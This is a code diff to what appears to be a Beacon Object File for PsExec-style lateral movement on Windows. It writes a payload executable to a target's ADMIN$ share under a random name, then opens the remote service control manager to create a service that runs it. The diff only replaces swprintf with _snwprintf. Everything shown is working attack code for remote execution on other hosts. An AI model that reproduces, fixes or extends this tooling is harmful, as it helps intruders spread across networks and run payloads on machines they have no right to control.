@@ -31,7 +31,7 @@ DECLSPEC_IMPORT void   WINAPI KERNEL32$Sleep(DWORD);
 
 DECLSPEC_IMPORT int __cdecl MSVCRT$rand(void);
 DECLSPEC_IMPORT void __cdecl MSVCRT$srand(unsigned int);
-DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
+DECLSPEC_IMPORT int __cdecl MSVCRT$_snwprintf(wchar_t*, size_t, const wchar_t*, ...);
 DECLSPEC_IMPORT int __cdecl MSVCRT$sprintf(char*, const char*, ...);
 
 void go(char *args, int args_len) {
@@ -65,7 +65,7 @@ void go(char *args, int args_len) {
     if (servicename && *servicename) {
         KERNEL32$MultiByteToWideChar(CP_UTF8, 0, servicename, -1, wSvcName, 64);
     } else {
-        MSVCRT$swprintf(wSvcName, 64, L"svc_%04x%04x",
+        MSVCRT$_snwprintf(wSvcName, 64, L"svc_%04x%04x",
             MSVCRT$rand() & 0xFFFF, MSVCRT$rand() & 0xFFFF);
     }
 
@@ -73,7 +73,7 @@ void go(char *args, int args_len) {
     if (remotepath && *remotepath) {
         KERNEL32$MultiByteToWideChar(CP_UTF8, 0, remotepath, -1, wRemoteFile, 128);
     } else {
-        MSVCRT$swprintf(wRemoteFile, 128, L"%04x%04x.exe",
+        MSVCRT$_snwprintf(wRemoteFile, 128, L"%04x%04x.exe",
             MSVCRT$rand() & 0xFFFF, MSVCRT$rand() & 0xFFFF);
     }
 
@@ -82,7 +82,7 @@ void go(char *args, int args_len) {
 
     /* Step 1: Write payload to \\target\ADMIN$\filename.exe */
     wchar_t uncPath[512] = {0};
-    MSVCRT$swprintf(uncPath, 512, L"\\\\%s\\ADMIN$\\%s", wTarget, wRemoteFile);
+    MSVCRT$_snwprintf(uncPath, 512, L"\\\\%s\\ADMIN$\\%s", wTarget, wRemoteFile);
 
     HANDLE hFile = KERNEL32$CreateFileW(uncPath, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -107,7 +107,7 @@ void go(char *args, int args_len) {
 
     /* Step 2: Create service pointing to C:\Windows\filename.exe */
     wchar_t binPath[512] = {0};
-    MSVCRT$swprintf(binPath, 512, L"C:\\Windows\\%s", wRemoteFile);
+    MSVCRT$_snwprintf(binPath, 512, L"C:\\Windows\\%s", wRemoteFile);
 
     SC_HANDLE hSCM = ADVAPI32$OpenSCManagerW(wTarget, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hSCM) {
